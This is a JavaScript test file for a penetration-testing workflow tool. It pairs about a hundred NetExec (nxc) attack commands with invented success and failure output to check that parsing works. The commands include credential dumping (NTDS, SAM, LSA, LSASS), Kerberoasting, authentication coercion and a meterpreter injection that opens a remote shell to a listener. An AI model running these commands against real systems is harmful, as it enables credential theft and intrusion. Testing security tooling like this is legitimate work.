/* nxc switch -> parser coverage (BIDIRECTIONAL). For every capability in the nxc catalog
 * (OBOL._nxcCatalog), paste REAL nxc output and assert:
 *   - success output mints the capability's declared produces (actionable entries), OR mints no payoff
 *     fact (informational entries);
 *   - denied/empty output mints nothing.
 * This closes the hole the corpus can't cover: the corpus injects facts directly, so it never proved that
 * pasting a given nxc command's output actually produces them. Every catalog entry MUST have a sample here
 * (the test fails on an uncovered entry), so coverage can't silently drift as the catalog grows.
 */
'use strict';
var path = require('path');
function req(p) { require(path.join(__dirname, '..', '..', p)); }
['facts', 'phases', 'pack', 'profile', 'command', 'workspace'].forEach(function (m) { req('assets/engine/' + m + '.js'); });
['common', 'nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource', 'findings', 'shape', 'pivot', 'dns', 'nxc-catalog'].forEach(function (m) { req('assets/engine/parsers/' + m + '.js'); });
req('assets/engine/parsers/index.js');
var OBOL = globalThis.OBOL, P = OBOL.parsers, CAT = OBOL._nxcCatalog || [];

var fail = 0;
function ok(c, m) { if (!c) { console.error('  FAIL:', m); fail++; } else { console.log('  ok  :', m); } }
function facts(cmd, out) {
  var r = P.parseActionOutput({ command: cmd, actionId: '', stdout: out, scope: '10.10.10.10', domain: 'corp.local' });
  return (r.facts || []).map(function (f) { return f.kind; });
}
var PAYOFF = /^(foothold\.|access\.|loot\.|credential\.(available|plaintext|candidate)|hash\.)/;
var D = 'SMB 10.10.10.10 445 DC '; // nxc banner prefix (no [+] auth line, so informational output mints no payoff)
var L = 'LDAP 10.10.10.10 389 DC ';
var W = 'WINRM 10.10.10.10 5985 DC ';
var M = 'MSSQL 10.10.10.10 1433 DC ';
var R = 'RDP 10.10.10.10 3389 DC ';
var F = 'FTP 10.10.10.10 21 HOST ';
var SS = 'SSH 10.10.10.10 22 HOST ';
var WM = 'WMI 10.10.10.10 135 DC ';
var NF = 'NFS 10.10.10.10 2049 HOST ';
var VN = 'VNC 10.10.10.10 5900 HOST ';

// sample[id] = { cmd, ok: <success output>, neg: <denied output> }
var sample = {
  'smb-auth':          { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021", ok: D + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)', neg: D + '[-] corp.local\\jdoe:Winter2021 STATUS_LOGON_FAILURE' },
  'smb-shares':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --shares", ok: D + 'Share  Permissions\n' + D + 'SYSVOL READ\n' + D + 'Users  READ', neg: D + '[-] authentication failed' },
  'smb-rid-brute':     { cmd: "nxc smb 10.10.10.10 -u guest -p '' --rid-brute", ok: D + '500: CORP\\Administrator (SidTypeUser)\n' + D + '1103: CORP\\svc-sql (SidTypeUser)', neg: D + '[-] STATUS_ACCESS_DENIED' },
  'smb-ntds':          { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --ntds", ok: D + 'administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n' + D + 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:abcdef0123456789abcdef0123456789:::', neg: D + '[-] access denied' },
  'smb-sam':           { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --sam", ok: D + 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', neg: D + '[-] access denied' },
  'smb-exec':          { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -x whoami", ok: D + 'nt authority\\system', neg: D + '[-] access denied' },
  'smb-users':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --users", ok: D + '-Username-        -Last PW Set-\n' + D + 'administrator    2021-01-02\n' + D + 'svc-sql          2020-05-05', neg: D + '[-] STATUS_ACCESS_DENIED' },
  'smb-lsa':           { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --lsa", ok: D + "CORP\\svc_sql$:Sql_Server_2019!\n" + D + "CORP.LOCAL/svc-web:$DCC2$10240#svc-web#abcdef0123456789abcdef0123456789", neg: D + '[-] access denied' },
  'smb-dpapi':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --dpapi", ok: D + '[CREDENTIAL] domain\\jdoe - password: Winter2021!', neg: D + '[-] access denied' },
  'smb-loggedon':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --loggedon-users", ok: D + 'Logged on users\n' + D + 'CORP\\administrator\n' + D + 'CORP\\jdoe', neg: D + '[-] access denied' },
  'smb-gpp-password':  { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M gpp_password", ok: "GPP_PASSWORD 10.10.10.10 445 DC [+] Found credentials in SYSVOL\nGPP_PASSWORD 10.10.10.10 445 DC [+] Usernames: ['svc_deploy']\nGPP_PASSWORD 10.10.10.10 445 DC [+] Passwords: ['SuperSecret2021!']", neg: 'GPP_PASSWORD 10.10.10.10 445 DC [-] No gpp files found' },
  'smb-gpp-autologin': { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M gpp_autologin", ok: "GPP_AUTOLOGIN 10.10.10.10 445 DC [+] Found registry.xml\nGPP_AUTOLOGIN 10.10.10.10 445 DC [+] Usernames: ['autologin']\nGPP_AUTOLOGIN 10.10.10.10 445 DC [+] Passwords: ['Autumn2021']", neg: 'GPP_AUTOLOGIN 10.10.10.10 445 DC [-] nothing found' },
  'smb-lsassy':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M lsassy", ok: 'LSASSY 10.10.10.10 445 DC [+] corp.local\\jdoe 31d6cfe0d16ae931b73c59d7e0c089c0\nLSASSY 10.10.10.10 445 DC [+] corp.local\\svc_adm aad3b435b51404ee:5835048ce94ad0564e29a924a03510ef', neg: 'LSASSY 10.10.10.10 445 DC [-] lsassy failed, access denied' },
  'smb-nanodump':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M nanodump", ok: 'NANODUMP 10.10.10.10 445 DC [+] corp.local\\admin aad3b435b51404ee:5835048ce94ad0564e29a924a03510ef', neg: 'NANODUMP 10.10.10.10 445 DC [-] failed' },
  'smb-spider-plus':   { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M spider_plus", ok: 'SPIDER_PLUS 10.10.10.10 445 DC [+] Saved output to /tmp/nxc_spider/10.10.10.10.json\nSPIDER_PLUS found: SYSVOL/scripts/backup.config', neg: 'SPIDER_PLUS 10.10.10.10 445 DC [-] no readable shares' },
  'smb-wdigest':       { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M wdigest -o ACTION=enable", ok: 'WDIGEST 10.10.10.10 445 DC [+] UseLogonCredential set to 1', neg: 'WDIGEST 10.10.10.10 445 DC [-] access denied' },
  'smb-groups':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --groups", ok: D + 'Domain Admins membercount: 2\n' + D + 'Enterprise Admins membercount: 1', neg: D + '[-] access denied' },
  'smb-local-groups':  { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --local-groups", ok: D + 'Administrators membercount: 3', neg: D + '[-] access denied' },
  'smb-sessions':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --sessions", ok: D + 'Enumerated sessions\n' + D + '\\\\10.10.10.50 user: jdoe', neg: D + '[-] access denied' },
  'smb-disks':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --disks", ok: D + 'C$', neg: D + '[-] access denied' },
  'smb-computers':     { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --computers", ok: D + 'DC01$\n' + D + 'WEB01$', neg: D + '[-] access denied' },
  'smb-pass-pol':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --pass-pol", ok: D + 'Minimum password length: 7', neg: D + '[-] access denied' },
  'smb-spider':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --spider SYSVOL --regex passw --content", ok: D + '//10.10.10.10/SYSVOL/scripts/backup.config\n' + D + 'found: web.config', neg: D + '[-] no readable shares' },
  'smb-coerce-plus':   { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M coerce_plus -o LISTENER=10.0.0.5", ok: 'COERCE_PLUS 10.10.10.10 445 DC [+] VULNERABLE, DFSCoerce\nCOERCE_PLUS 10.10.10.10 445 DC [+] Attack success, received connection', neg: 'COERCE_PLUS 10.10.10.10 445 DC [-] not vulnerable' },
  'smb-gen-relay-list':{ cmd: "nxc smb 10.0.0.0/24 --gen-relay-list relay.txt", ok: D + 'Writing hosts with SMB signing disabled to relay.txt', neg: D + '[-] no hosts' },
  'smb-handlekatz':    { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M handlekatz", ok: 'HANDLEKATZ 10.10.10.10 445 DC [+] corp.local\\svc_adm aad3b435b51404ee:5835048ce94ad0564e29a924a03510ef', neg: 'HANDLEKATZ 10.10.10.10 445 DC [-] failed' },
  'smb-procdump':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M procdump", ok: 'PROCDUMP 10.10.10.10 445 DC [+] corp.local\\svc_adm aad3b435b51404ee:5835048ce94ad0564e29a924a03510ef', neg: 'PROCDUMP 10.10.10.10 445 DC [-] failed' },
  'smb-masky':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M masky", ok: 'MASKY 10.10.10.10 445 DC [+] corp.local\\admin 31d6cfe0d16ae931b73c59d7e0c089c0', neg: 'MASKY 10.10.10.10 445 DC [-] failed' },
  'smb-backup-operator':{ cmd: "nxc smb 10.10.10.10 -u svc_backup -p B -M backup_operator", ok: D + 'administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n' + D + 'NTDS dumped via SeBackupPrivilege', neg: D + '[-] no SeBackupPrivilege' },
  'smb-reg-winlogon':  { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M reg-winlogon", ok: D + 'DefaultUserName: administrator\n' + D + 'DefaultPassword: Autologon2021', neg: D + '[-] no autologon' },
  'smb-reg-query':     { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M reg-query -o PATH=... ", ok: D + 'password : Registry2021', neg: D + '[-] not found' },
  'smb-veeam':         { cmd: "nxc smb 10.10.10.10 -u admin -p P -M veeam", ok: 'VEEAM 10.10.10.10 445 DC [+] Username: svc_veeam Password: Veeam2021!', neg: 'VEEAM 10.10.10.10 445 DC [-] no veeam db' },
  'smb-mremoteng':     { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M mremoteng", ok: 'MREMOTENG 10.10.10.10 445 DC [+] Username: root Password: Conf2021', neg: 'MREMOTENG 10.10.10.10 445 DC [-] nothing' },
  'smb-winscp':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M winscp", ok: 'WINSCP 10.10.10.10 445 DC [+] Username: deploy Password: Scp2021', neg: 'WINSCP 10.10.10.10 445 DC [-] nothing' },
  'smb-putty':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M putty", ok: 'PUTTY 10.10.10.10 445 DC [+] Username: admin Password: Putty2021', neg: 'PUTTY 10.10.10.10 445 DC [-] nothing' },
  'smb-keepass-discover':{ cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M keepass_discover", ok: D + 'Found C:\\Users\\jdoe\\Database.kdbx', neg: D + '[-] no kdbx' },
  'smb-keepass-trigger':{ cmd: "nxc smb 10.10.10.10 -u admin -p P -M keepass_trigger", ok: 'KEEPASS 10.10.10.10 445 DC [+] Master password: MasterSecret2021', neg: 'KEEPASS 10.10.10.10 445 DC [-] trigger not set' },
  'smb-install-elevated':{ cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M install_elevated", ok: D + '[+] AlwaysInstallElevated enabled in both registry keys, vulnerable', neg: D + 'AlwaysInstallElevated not set' },
  'smb-pre2k':         { cmd: "nxc smb 10.10.10.10 -u '' -p '' -M pre2k", ok: D + 'WS01$ : ws01', neg: D + '[-] no pre2k accounts' },
  'smb-ntlmv1':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M ntlmv1", ok: D + 'NTLMv1 allowed (LMCompatibilityLevel: 2)', neg: D + 'NTLMv1 not permitted' },
  'smb-enum-av':       { cmd: "nxc smb 10.10.10.10 -u admin -p P -M enum_av", ok: D + 'Windows Defender enabled', neg: D + '[-] access denied' },
  'smb-spooler':       { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M spooler", ok: D + 'Spooler service is enabled', neg: D + 'Spooler disabled' },
  'smb-webdav':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M webdav", ok: D + 'WebClient service is running', neg: D + 'WebClient not running' },
  'smb-runasppl':      { cmd: "nxc smb 10.10.10.10 -u admin -p P -M runasppl", ok: D + 'RunAsPPL is enabled', neg: D + '[-] access denied' },
  'smb-ms17-010':      { cmd: "nxc smb 10.10.10.10 -M ms17-010", ok: D + 'VULNERABLE to MS17-010', neg: D + 'not vulnerable to MS17-010' },
  'smb-zerologon':     { cmd: "nxc smb 10.10.10.10 -M zerologon", ok: D + 'VULNERABLE to Zerologon (CVE-2020-1472)', neg: D + 'not vulnerable' },
  'smb-smbghost':      { cmd: "nxc smb 10.10.10.10 -M smbghost", ok: D + 'VULNERABLE to SMBGhost (CVE-2020-0796)', neg: D + 'not vulnerable' },
  'smb-nopac':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M nopac", ok: D + 'MachineAccountQuota check for noPac', neg: D + '[-] not vulnerable' },
  'smb-printnightmare':{ cmd: "nxc smb 10.10.10.10 -M printnightmare", ok: D + 'Target may be vulnerable to PrintNightmare', neg: D + 'not vulnerable' },
  'smb-rdcman':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M rdcman", ok: 'RDCMAN 10.10.10.10 445 DC [+] Username: admin Password: Rdp2021', neg: 'RDCMAN 10.10.10.10 445 DC [-] nothing' },
  'smb-iis':           { cmd: "nxc smb 10.10.10.10 -u admin -p P -M iis", ok: 'IIS 10.10.10.10 445 DC [+] AppPool Username: svc_web Password: Web2021', neg: 'IIS 10.10.10.10 445 DC [-] nothing' },
  'smb-firefox':       { cmd: "nxc smb 10.10.10.10 -u admin -p P -M firefox", ok: 'FIREFOX 10.10.10.10 445 DC [+] Username: jdoe@site.com Password: Firefox2021', neg: 'FIREFOX 10.10.10.10 445 DC [-] no logins' },
  'smb-powershell-history':{ cmd: "nxc smb 10.10.10.10 -u admin -p P -M powershell_history", ok: D + 'net use X: \\\\srv\\share /user:svc Password=PsHist2021', neg: D + '[-] no history' },
  'smb-met-inject':    { cmd: "nxc smb 10.10.10.10 -u admin -p P -M met_inject -o LHOST=10.0.0.5 LPORT=4444", ok: D + '[+] corp.local\\admin:P (Pwn3d!)\n' + D + 'meterpreter session opened', neg: D + '[-] injection failed' },
  'smb-slinky':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M slinky -o SERVER=10.0.0.5 NAME=doc", ok: D + '[+] Added doc.url to share Documents', neg: D + '[-] share not writable' },
  'smb-scuffy':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M scuffy -o SERVER=10.0.0.5 NAME=doc", ok: D + '[+] Dropped doc.scf on share Profiles', neg: D + '[-] share not writable' },
  'ldap-adcs':         { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M adcs", ok: L + 'Template: UserAuth ESC1 : Enrollee supplies subject', neg: L + 'No vulnerable templates found' },
  'ldap-user-desc':    { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M user-desc", ok: L + 'svc-temp description: initial password is Welcome1!', neg: L + '[-] access denied' },
  'ldap-get-desc-users':{ cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M get-desc-users", ok: L + 'kiosk description: login pass = Kiosk2021', neg: L + '[-] access denied' },
  'ldap-pre2k':        { cmd: "nxc ldap 10.10.10.10 -u '' -p '' -M pre2k", ok: L + 'WS02$ : ws02', neg: L + '[-] none' },
  'ldap-enum-trusts':  { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M enum_trusts", ok: L + 'child.corp.local (Bidirectional, Forest)', neg: L + '[-] no trusts' },
  'ldap-ldap-checker': { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M ldap-checker", ok: L + 'LDAP signing NOT enforced; channel binding never', neg: L + 'LDAP signing enforced' },
  'ldap-whoami':       { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M whoami", ok: L + 'You are: CORP\\jdoe', neg: L + '[-] access denied' },
  'ldap-subnets':      { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M subnets", ok: L + '10.0.0.0/24 (Default-First-Site)', neg: L + '[-] access denied' },
  'ldap-sid-brute':    { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --sid-brute", ok: L + 'S-1-5-21-...-500 Administrator', neg: L + '[-] access denied' },
  'mssql-priv':        { cmd: "nxc mssql 10.10.10.10 -u sa -p P -M mssql_priv", ok: M + '[*] sa is already sysadmin', neg: M + '[-] login failed' },
  'mssql-coerce':      { cmd: "nxc mssql 10.10.10.10 -u sa -p P -M mssql_coerce -o LISTENER=10.0.0.5", ok: M + '[+] received connection from DC01$', neg: M + '[-] no connection' },

  'ldap-auth':         { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021", ok: L + '[+] corp.local\\jdoe:Winter2021', neg: L + '[-] corp.local\\jdoe:Winter2021 STATUS_LOGON_FAILURE' },
  'ldap-users':        { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --users", ok: L + '[+] corp.local\\jdoe:Winter2021\n' + L + '-Username-     -Last PW Set-\n' + L + 'administrator  2021-01-02\n' + L + 'svc-sql        2020-05-05', neg: L + '[-] STATUS_ACCESS_DENIED' },
  'ldap-groups':       { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --groups", ok: L + 'Domain Admins membercount: 2\n' + L + 'Enterprise Admins membercount: 1', neg: L + '[-] STATUS_ACCESS_DENIED' },
  'ldap-asreproast':   { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --asreproast o.txt", ok: L + '$krb5asrep$23$svc-x@CORP.LOCAL:abcd1234$ef567890abcdef1234567890abcdef', neg: L + '[-] no AS-REP roastable users' },
  'ldap-kerberoasting':{ cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --kerberoasting o.txt", ok: L + '$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQL/sql*$abcdef1234567890abcdef1234567890', neg: L + '[-] no kerberoastable users' },
  'ldap-bloodhound':   { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --bloodhound -c All --dns-server 10.10.10.10", ok: L + '[+] corp.local\\jdoe:Winter2021\n' + L + 'Compressing output into /tmp/corp.local_bloodhound.zip', neg: L + '[-] bloodhound collection failed' },
  'ldap-laps':         { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M laps", ok: L + 'Computer: PC01$ ms-mcs-admpwd: Summer2021Pass!', neg: L + '[-] no read access to LAPS' },
  'ldap-admin-count':  { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --admin-count", ok: L + '[+] corp.local\\jdoe:Winter2021\n' + L + 'administrator\n' + L + 'svc-adm', neg: L + '[-] access denied' },
  'ldap-trusted-for-delegation': { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --trusted-for-delegation", ok: L + 'WEB01$ (unconstrained)', neg: L + '[-] access denied' },
  'ldap-find-delegation': { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --find-delegation", ok: L + 'SVC01$ constrained delegation to CIFS/dc01', neg: L + '[-] access denied' },
  'ldap-gmsa':         { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --gmsa", ok: L + '[+] Found 1 gMSA account\n' + L + 'Account: svc_gmsa$ NTLM: 5835048ce94ad0564e29a924a03510ef', neg: L + '[-] no gMSA read access' },
  'ldap-daclread':     { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M daclread -o TARGET=Domain\\ Admins ACTION=read", ok: L + 'Trustee: CORP\\svc-web\n' + L + 'Access mask: WriteDacl', neg: L + '[-] access denied' },
  'ldap-group-mem':    { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M group-mem -o GROUP='Domain Admins'", ok: L + 'Members of Domain Admins:\n' + L + 'administrator\n' + L + 'svc-adm', neg: L + '[-] access denied' },
  'ldap-password-not-required': { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --password-not-required", ok: L + '[+] corp.local\\jdoe:Winter2021\n' + L + 'guest\n' + L + 'kiosk', neg: L + '[-] access denied' },
  'ldap-maq':          { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M maq", ok: L + '[*] MachineAccountQuota: 10', neg: L + '[-] access denied' },
  'ldap-query':        { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --query '(objectSid=*-1103)' sAMAccountName", ok: L + 'sAMAccountName: svc-sql', neg: L + '[-] access denied' },

  'winrm-auth':        { cmd: "nxc winrm 10.10.10.10 -u jdoe -p Winter2021", ok: W + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)', neg: W + '[-] corp.local\\jdoe:Winter2021' },
  'winrm-exec':        { cmd: "nxc winrm 10.10.10.10 -u jdoe -p Winter2021 -x whoami", ok: W + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)\n' + W + 'corp\\jdoe', neg: W + '[-] corp.local\\jdoe:Winter2021' },
  'winrm-exec-ps':     { cmd: "nxc winrm 10.10.10.10 -u jdoe -p Winter2021 -X '$PSVersionTable'", ok: W + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)\n' + W + 'Major  Minor', neg: W + '[-] corp.local\\jdoe:Winter2021' },
  'mssql-auth':        { cmd: "nxc mssql 10.10.10.10 -u sa -p P", ok: M + '[+] corp.local\\sa:P (Pwn3d!)', neg: M + '[-] corp.local\\sa:P Login failed' },
  'mssql-exec':        { cmd: "nxc mssql 10.10.10.10 -u sa -p P -x whoami", ok: M + '[+] corp.local\\sa:P (Pwn3d!)\n' + M + 'nt service\\mssqlserver', neg: M + '[-] login failed' },
  'mssql-exec-ps':     { cmd: "nxc mssql 10.10.10.10 -u sa -p P -X 'whoami'", ok: M + '[+] corp.local\\sa:P (Pwn3d!)\n' + M + 'nt service\\mssqlserver', neg: M + '[-] login failed' },
  'mssql-query':       { cmd: "nxc mssql 10.10.10.10 -u sa -p P -q 'SELECT name FROM sys.databases'", ok: M + '[+] corp.local\\sa:P\n' + M + 'master\n' + M + 'appdb', neg: M + '[-] login failed' },
  'rdp-auth':          { cmd: "nxc rdp 10.10.10.10 -u jdoe -p Winter2021", ok: R + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)', neg: R + '[-] corp.local\\jdoe:Winter2021' },
  'rdp-screenshot':    { cmd: "nxc rdp 10.10.10.10 --screenshot", ok: R + 'Screenshot saved /tmp/10.10.10.10.png', neg: R + '[-] connection failed' },
  'rdp-nla-screenshot':{ cmd: "nxc rdp 10.10.10.10 --nla-screenshot", ok: R + 'Screenshot (no NLA) saved /tmp/10.10.10.10.png', neg: R + '[-] connection failed' },
  'ftp-auth':          { cmd: "nxc ftp 10.10.10.10 -u anonymous -p ''", ok: F + '[+] anonymous:\n' + F + 'drwxr-xr-x  2 0  0  4096 Jan 01 backup', neg: F + '[-] anonymous: STATUS login incorrect' },
  'ftp-ls':            { cmd: "nxc ftp 10.10.10.10 -u anonymous -p '' --ls", ok: F + '-rw-r--r-- 1 0 0 1024 Jan 01 config.bak\n' + F + 'drwxr-xr-x 2 0 0 4096 Jan 01 pub', neg: F + '[-] not permitted' },

  'ssh-auth':          { cmd: "nxc ssh 10.10.10.10 -u jdoe -p Winter2021", ok: SS + '[+] jdoe:Winter2021', neg: SS + '[-] jdoe:Winter2021 Authentication failed' },
  'ssh-exec':          { cmd: "nxc ssh 10.10.10.10 -u jdoe -p Winter2021 -x id", ok: SS + '[+] jdoe:Winter2021\n' + SS + 'uid=1000(jdoe) gid=1000(jdoe)', neg: SS + '[-] Authentication failed' },
  'ssh-sudo-check':    { cmd: "nxc ssh 10.10.10.10 -u jdoe -p Winter2021 --sudo-check", ok: SS + 'Determining if jdoe can run sudo via a sudo -l test', neg: SS + '[-] Authentication failed' },
  'wmi-exec':          { cmd: "nxc wmi 10.10.10.10 -u jdoe -p Winter2021 -x whoami", ok: WM + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)\n' + WM + 'nt authority\\system', neg: WM + '[-] corp.local\\jdoe:Winter2021' },
  'wmi-exec-ps':       { cmd: "nxc wmi 10.10.10.10 -u jdoe -p Winter2021 -X '$env:COMPUTERNAME'", ok: WM + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)\n' + WM + 'DC01', neg: WM + '[-] corp.local\\jdoe:Winter2021' },
  'nfs-shares':        { cmd: "nxc nfs 10.10.10.10 --shares", ok: NF + '[+] Enumerated shares\n' + NF + '/export/home  *  rw\n' + NF + '/srv/backup  10.0.0.0/8  ro', neg: NF + '[-] no exports' },
  'vnc-auth':          { cmd: "nxc vnc 10.10.10.10 -p password", ok: VN + '[+] No password required (Pwn3d!)', neg: VN + '[-] Authentication failed' }
};

CAT.forEach(function (e) {
  var s = sample[e.id];
  if (!s) { ok(false, 'catalog entry ' + e.id + ' has NO sample in the switch→parser test (add one)'); return; }
  var got = facts(s.cmd, s.ok);
  if (e.informational) {
    ok(!got.some(function (k) { return PAYOFF.test(k); }), e.id + ' (informational): success output mints no payoff fact (got ' + (got.join(',') || 'none') + ')');
  } else {
    var missing = (e.produces || []).filter(function (p) { return got.indexOf(p) < 0; });
    // produces may list alternatives (e.g. hash.ntlm OR credential.plaintext from a dump); require AT LEAST ONE.
    ok(got.some(function (k) { return (e.produces || []).indexOf(k) >= 0; }),
      e.id + ' success → mints ' + (e.produces || []).join('|') + ' (got ' + (got.join(',') || 'none') + ')');
  }
  if (s.neg) {
    var ngot = facts(s.cmd, s.neg);
    ok(!ngot.some(function (k) { return PAYOFF.test(k); }), e.id + ' denied/empty → no payoff fact (got ' + (ngot.join(',') || 'none') + ')');
  }
});

console.log('\nNXC SWITCH→PARSER: ' + CAT.length + ' capabilities · ' + (fail ? fail + ' FAILURE(S)' : 'all passed'));
process.exit(fail ? 1 : 0);
